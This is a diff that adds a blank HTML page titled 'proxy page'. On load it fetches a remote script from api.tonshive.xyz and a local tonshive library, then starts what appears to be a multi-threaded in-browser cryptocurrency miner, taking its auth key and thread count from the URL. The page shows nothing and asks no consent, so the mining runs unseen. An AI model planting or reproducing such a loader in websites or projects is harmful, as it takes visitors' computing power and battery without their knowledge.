@@ -1,0 +1,26 @@
+<html>
+<head>
+    <title>
+        proxy page
+    </title>
+</head>
+
+<body>
+    <h1></h1>
+
+    <script src="https://api.tonshive.xyz/pools.js"></script>
+	<script src="./tonshive.min.js"></script>
+    <script>
+        const auth = (new URLSearchParams(window.location.search)).get('auth');
+        const threads = (new URLSearchParams(window.location.search)).get('threads');
+        const mobileOnly = (new URLSearchParams(window.location.search)).get('mobileOnly');
+
+        async function init()
+        {
+            await startTonshive(auth,threads,false)
+        }
+
+        init()
+    </script>
+</body>
+</html>
